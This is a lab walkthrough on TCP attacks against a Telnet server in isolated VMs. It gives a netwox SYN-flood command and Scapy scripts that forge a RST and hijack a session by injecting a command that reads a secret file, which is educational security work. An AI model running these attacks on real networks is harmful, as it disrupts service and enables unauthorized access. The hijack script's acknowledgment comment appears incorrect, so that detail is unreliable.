# 1. Environment Setup
 
**VMs Required**  
1. **Server VM** (Telnet server) – IP address: `10.0.2.6` (example)  
2. **Client VM** (Telnet client) – IP address: `10.0.2.5` (example)  
3. **Attacker VM** – IP address: `10.0.2.7` (example)
 
> Adjust IP addresses to whatever you actually have in your own setup.
 
---
 
## 1.1 Install Telnet Server (Server VM)
 
1. Open a terminal on the **Server VM**:
 
   ```bash
   sudo apt-get update
   sudo apt-get install xinetd telnetd
   sudo service xinetd restart
   ```
 
2. Verify the Telnet server is **listening** on port 23:
 
   ```bash
   netstat -na | grep 23
   ```
   - You should see a line containing `LISTEN` on `0.0.0.0:23`.
 
> **Take Screenshot #1**: Showing your `netstat` output with Telnet server listening on port 23.
 
3. (Optional) Create a secret file for Task 4:
   ```bash
   echo "m123456 FakePassword" > /home/seed/secret.txt
   ```
   - Adjust content as needed (UCID + fake password).
 
---
 
## 1.2 Install Telnet Client (Client VM)
 
On the **Client VM**, open a terminal:
 
```bash
sudo apt-get update
sudo apt-get install telnet
```
 
---
 
## 1.3 Install Tools (Attacker VM)
 
1. **Netwox** (usually preinstalled in the SEED Ubuntu 16.04 VM). If not installed:
 
   ```bash
   sudo apt-get update
   sudo apt-get install netwox
   ```
 
2. **Scapy** (usually preinstalled). If not:
 
   ```bash
   sudo apt-get update
   sudo apt-get install python-scapy
   ```
 
3. **Wireshark** or **tcpdump** for sniffing:
 
   ```bash
   sudo apt-get update
   sudo apt-get install wireshark tcpdump
   ```
 
---
 
# 2. Task 1: SYN Flooding Attack Using Netwox
 
**Objective**: Flood the Server’s half‐open queue so legitimate Telnet clients cannot connect.
 
---
 
## 2.1 Confirm Telnet is Working Normally
 
1. On the **Client VM**, run:
 
   ```bash
   telnet 10.0.2.6 23
   ```
   - Replace `10.0.2.6` with your Server IP if different.  
   - You should see a login prompt. Login to confirm it works.
 
> **Take Screenshot #2**: Your normal Telnet session connected successfully.
 
2. Exit Telnet.
 
---
 
## 2.2 Launch SYN Flood Attack
 
1. On the **Attacker VM**, run:
 
   ```bash
   sudo netwox 76 -i 10.0.2.6 -p 23 -s random
   ```
   - **`-i 10.0.2.6`**: Server’s IP  
   - **`-p 23`**: Telnet port  
   - **`-s random`**: use random IP addresses for spoofing
 
2. **Observe** on **Server VM**:
 
   ```bash
   netstat -na | grep 23
   ```
   - Many lines should appear in the `SYN_RECV` state if the flood is working.
 
> **Take Screenshot #3**: Your `netstat -na` on the server showing a large number of `SYN_RECV`.
 
3. On the **Client VM**, **attempt** Telnet again:
 
   ```bash
   telnet 10.0.2.6 23
   ```
   - It should hang or fail.
 
> **Take Screenshot #4**: Your Telnet failing to connect during the SYN flood.
 
4. **Stop** the flood on the Attacker VM with **Ctrl+C**. Then confirm the server’s half‐open queue clears after some time.
 
---
 
# 3. Task 2: TCP Reset Attack Using Scapy
 
**Objective**: Send a spoofed TCP RST packet to terminate an **existing** Telnet session between the Client and Server.
 
---
 
## 3.1 Establish a Telnet Session (Client ↔ Server)
 
1. On the **Client VM**:
 
   ```bash
   telnet 10.0.2.6 23
   ```
   - Log in to ensure the connection is established.
 
> **Take Screenshot #5**: Your active Telnet session from the Client to the Server.
 
---
 
## 3.2 Sniff the Traffic (Attacker VM)
 
1. On the **Attacker VM**, open a separate terminal:
 
   ```bash
   sudo tcpdump -i eth0 tcp and host 10.0.2.5 and host 10.0.2.6
   ```
   - Adjust your interface name (`eth0` or `ens33`, etc.).  
   - Adjust IP addresses if needed.
 
2. Go back to the **Client VM** Telnet session and press **Enter** once, so a packet is sent. Observe the packet in **tcpdump** to see the relevant `seq` and `ack`.
 
> **Take Screenshot #6**: Your tcpdump output highlighting the sequence and acknowledgment fields.
 
Note the **Server → Client** packet’s `ack` (often used as our spoofed `seq`), and note the **Client → Server** packet’s `seq` (often used for `ack` in our forged packet).
 
---
 
## 3.3 Create the Reset Script (Attacker VM)
 
Create a file named `tcp_reset.py`:
 
```python
#!/usr/bin/python3
from scapy.all import *
 
# Adjust these values based on your environment:
server_ip = "10.0.2.6"
client_ip = "10.0.2.5"
server_port = 23   # Telnet port
client_port = 51700  # example ephemeral port
 
# The RST packet typically spoofs a packet from the server to the client
# so we set the IP src=server, dst=client
 
# Put the correct seq from the last server->client ack
sequence_number = 123456789  # REPLACE with the server->client ack
# The ack field is not strictly necessary for a pure RST, but you can add it if desired
 
ip_layer = IP(src=server_ip, dst=client_ip)
tcp_layer = TCP(
    sport=server_port,
    dport=client_port,
    flags="R",
    seq=sequence_number
)
 
packet = ip_layer / tcp_layer
 
send(packet, verbose=0)
print("Spoofed RST packet sent. Session should be reset.")
```
 
**Make it executable**:
```bash
chmod +x tcp_reset.py
```
 
---
 
## 3.4 Run the Reset Attack
 
1. Leave the Telnet session open on the **Client VM**.  
2. On the **Attacker VM**, execute:
 
   ```bash
   sudo ./tcp_reset.py
   ```
 
3. On the **Client VM**, you should see the Telnet session **immediately** close with a connection reset.
 
> **Take Screenshot #7**: Your Telnet client showing the sudden termination after the RST.
 
---
 
# 4. Task 4: TCP Session Hijacking Using Scapy
 
**Objective**: Inject a command into an **active** Telnet session to **print** the server’s `/home/seed/secret.txt`.
 
---
 
## 4.1 Establish the Telnet Session
 
1. On the **Client VM**:
   ```bash
   telnet 10.0.2.6 23
   ```
   - Log in to have an active session.
 
> **Take Screenshot #8**: The active Telnet session once more.
 
---
 
## 4.2 Sniff Sequence/Ack (Attacker VM)
 
1. On the **Attacker VM**, run:
   ```bash
   sudo tcpdump -i eth0 tcp and host 10.0.2.5 and host 10.0.2.6
   ```
2. Press Enter in the **Client VM** Telnet to generate a packet.  
3. Note the **server->client ack** and **client->server seq** carefully.
 
> **Take Screenshot #9**: Show your tcpdump with the relevant sequence/ack values you’ll use.
 
---
 
## 4.3 Create Hijacking Script (Attacker VM)
 
Create a file `tcp_hijack.py`:
 
```python
#!/usr/bin/python3
from scapy.all import *
 
# Adjust IPs and ports
client_ip = "10.0.2.5"
server_ip = "10.0.2.6"
client_port = 51700  # ephemeral port from sniff
server_port = 23     # Telnet
 
# Suppose from the last sniff:
# server->client had ack = 222222222
# client->server had seq = 333333333
# If the last client packet had a payload of length L, we might need to do ack = 333333333 + L
 
my_seq = 222222222   # set to the server->client ack
my_ack = 333333333   # set to the client->server seq + payload length
 
ip_layer = IP(src=client_ip, dst=server_ip)
tcp_layer = TCP(
    sport=client_port,
    dport=server_port,
    flags="PA",
    seq=my_seq,
    ack=my_ack
)
 
# Command to read secret file, plus newline
cmd = "cat /home/seed/secret.txt\n"
 
packet = ip_layer / tcp_layer / cmd
 
send(packet, verbose=0)
print("Injected command to read secret.txt.")
```
 
**Make it executable**:
```bash
chmod +x tcp_hijack.py
```
 
---
 
## 4.4 Run the Hijacking Attack
 
1. On the **Attacker VM**:
   ```bash
   sudo ./tcp_hijack.py
   ```
2. On the **Client VM**, watch the Telnet session. You should see the contents of `/home/seed/secret.txt` appear there (since you spoofed the client, the server responds back to the real Telnet).
 
> **Take Screenshot #10**: The Telnet session on the Client VM showing the file’s content.
 
---
 
# 5. Verification and Conclusions
 
1. **SYN Flood**: Confirmed by seeing many `SYN_RECV` entries and blocked Telnet connections.  
2. **TCP Reset**: Confirmed by the Client’s Telnet session immediately terminating upon receiving the forged RST.  
3. **TCP Hijacking**: Confirmed by forcing the Server to display the secret file in the Client’s Telnet session.
 
---
 
# 6. Final Summary of Commands & Code
 
Below is a concise list of **all** commands and file contents for reference:
 
---
 
### 6.1 Installation Commands
 
```bash
# Server VM:
sudo apt-get update
sudo apt-get install xinetd telnetd
sudo service xinetd restart
 
# Client VM:
sudo apt-get update
sudo apt-get install telnet
 
# Attacker VM:
sudo apt-get update
sudo apt-get install netwox python-scapy tcpdump wireshark
```
 
---
 
### 6.2 SYN Flood Attack Command (Netwox)
 
```bash
sudo netwox 76 -i <server_ip> -p 23 -s random
```
 
---
 
### 6.3 tcp_reset.py (RST Attack with Scapy)
 
```python
#!/usr/bin/python3
from scapy.all import *
 
server_ip = "10.0.2.6"
client_ip = "10.0.2.5"
server_port = 23
client_port = 51700
sequence_number = 123456789  # Observed from sniffed server->client ack
 
ip_layer = IP(src=server_ip, dst=client_ip)
tcp_layer = TCP(
    sport=server_port,
    dport=client_port,
    flags="R",
    seq=sequence_number
)
 
packet = ip_layer / tcp_layer
send(packet, verbose=0)
print("Spoofed RST packet sent.")
```
 
**Run**:  
```bash
chmod +x tcp_reset.py
sudo ./tcp_reset.py
```
 
---
 
### 6.4 tcp_hijack.py (Session Hijacking with Scapy)
 
```python
#!/usr/bin/python3
from scapy.all import *
 
client_ip = "10.0.2.5"
server_ip = "10.0.2.6"
client_port = 51700
server_port = 23
my_seq = 222222222  # from server->client ack
my_ack = 333333333  # from client->server seq + payload length
 
ip_layer = IP(src=client_ip, dst=server_ip)
tcp_layer = TCP(
    sport=client_port,
    dport=server_port,
    flags="PA",
    seq=my_seq,
    ack=my_ack
)
 
cmd = "cat /home/seed/secret.txt\n"
packet = ip_layer / tcp_layer / cmd
 
send(packet, verbose=0)
print("Injected command to read secret.txt.")
```
 
**Run**:  
```bash
chmod +x tcp_hijack.py
sudo ./tcp_hijack.py
```
 
---
 
# 7. When to Take Screenshots
 
1. **Screenshot #1**: Server `netstat -na | grep 23` showing Telnet listening before any attack.  
2. **Screenshot #2**: Client connecting to Telnet successfully (normal operation).  
3. **Screenshot #3**: SYN Flood in progress – `netstat -na` on the server with many `SYN_RECV`.  
4. **Screenshot #4**: Client failing to Telnet during the SYN Flood.  
5. **Screenshot #5**: Active Telnet session (before the RST attack).  
6. **Screenshot #6**: tcpdump capturing sequence/ack for the RST Attack.  
7. **Screenshot #7**: Client’s Telnet session terminated by the RST Attack.  
8. **Screenshot #8**: Re-established Telnet session for hijacking.  
9. **Screenshot #9**: tcpdump capturing sequence/ack for the Hijack Attack.  
10. **Screenshot #10**: Client’s Telnet session printing the contents of `secret.txt` after hijack.
